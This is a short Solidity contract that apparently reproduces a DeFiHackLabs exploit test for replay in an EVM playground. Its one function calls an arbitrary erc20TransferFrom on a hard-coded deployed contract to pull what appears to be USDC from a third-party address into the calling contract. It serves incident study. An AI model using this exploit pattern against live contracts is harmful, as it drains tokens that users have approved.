// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// Standalone reproduction for the EVM Playground — mirrors the DeFiHackLabs
// Erc20transfer_exp.sol test's testExploit() body verbatim, but without
// inheriting forge-std Test/BaseTestWithBalanceLog (which depends on the
// Foundry cheatcode contract at 0x7109709E... being deployed; that address
// has no code in a plain EVM replay, so any cheatcode-gated modifier reverts
// on EXTCODESIZE before the real attack call ever runs).

interface I {
    function erc20TransferFrom(address, address, address, uint256) external;
}

contract Erc20transfer {
    function testExploit() external {
        I(0x43Dc865E916914FD93540461FdE124484FBf8fAa).erc20TransferFrom(
            0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, address(this), 0x3DADf003AFCC96d404041D8aE711B94F8C68c6a5, 0
        );
    }
}
